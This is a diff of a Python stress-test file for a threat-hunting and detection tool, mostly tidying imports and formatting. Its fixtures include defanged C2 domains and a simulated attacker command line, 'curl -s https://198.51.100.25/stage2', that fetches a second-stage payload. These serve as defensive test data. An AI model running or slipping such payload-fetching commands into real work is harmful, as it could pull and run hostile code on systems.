@@ -14,11 +14,7 @@ Covers:
 from __future__ import annotations
 
 import concurrent.futures
-import contextlib
 import json
-import os
-import sqlite3
-import tempfile
 import threading
 import time
 from datetime import UTC, datetime, timedelta
@@ -30,26 +26,17 @@ import httpx
 import pytest
 
 from hecate_runner.atomic_write import atomic_write_text
-from hecate_runner.config import Settings
 from hecate_runner.execution.attack_sequence import (
     AttackStage,
-    classify_query_stage,
     correlate_events_into_sequences,
-)
-from hecate_runner.execution.fusion import (
-    EndpointNetworkFusionEngine,
-    build_network_connection_query,
-    build_process_creation_query,
 )
 from hecate_runner.execution.normalizer import (
     NormalizedEvent,
     OCSFClassUID,
-    normalize_event,
 )
 from hecate_runner.misp_publisher import _indicator_attribute
 from hecate_runner.query_execution import (
     ElasticQueryProvider,
-    MockQueryProvider,
     ProposedQuery,
     QueryResult,
 )
@@ -59,7 +46,6 @@ from hecate_runner.trail import CycleTrail
 from hecate_runner.work_locks import acquire_work_lock
 from hecate_runner.workspace_paths import is_valid_hunt_id, query_directory
 
-
 # ==============================================================================
 # 1. Intake & Deduplication Stress
 # ==============================================================================
@@ -67,13 +53,11 @@ from hecate_runner.workspace_paths import is_valid_hunt_id, query_directory
 
 def test_indicator_deduplication_and_normalization_stress() -> None:
     """Stress test indicator parsing, refanging, typing, and deduplication under volume."""
-    indicators = [
-        {"type": "ipv4", "value": f"192.168.1.{i % 25}"} for i in range(200)
-    ] + [
-        {"type": "domain", "value": f"evil-c2-{i % 10}[.]io"} for i in range(150)
-    ] + [
-        {"type": "sha256", "value": f"{'a' * 60}{i % 5:04x}"} for i in range(100)
-    ]
+    indicators = (
+        [{"type": "ipv4", "value": f"192.168.1.{i % 25}"} for i in range(200)]
+        + [{"type": "domain", "value": f"evil-c2-{i % 10}[.]io"} for i in range(150)]
+        + [{"type": "sha256", "value": f"{'a' * 60}{i % 5:04x}"} for i in range(100)]
+    )
 
     deduped: dict[tuple[str, str], dict[str, Any]] = {}
     lock = threading.Lock()
@@ -387,14 +371,14 @@ def test_telemetry_fusion_engine_high_volume_stress() -> None:
 
         net_event.fuse_process_lineage(
             process_name="curl",
-            command_line=f"curl -s https://198.51.100.25/stage2",
+            command_line="curl -s https://198.51.100.25/stage2",
             pid=str(1000 + i),
         )
 
         assert not net_event.needs_lineage_fusion()
         assert net_event.fused_lineage
         assert net_event.process_name == "curl"
-        assert net_event.command_line == f"curl -s https://198.51.100.25/stage2"
+        assert net_event.command_line == "curl -s https://198.51.100.25/stage2"
         assert net_event.host == f"host-{i % 10}"
 
 
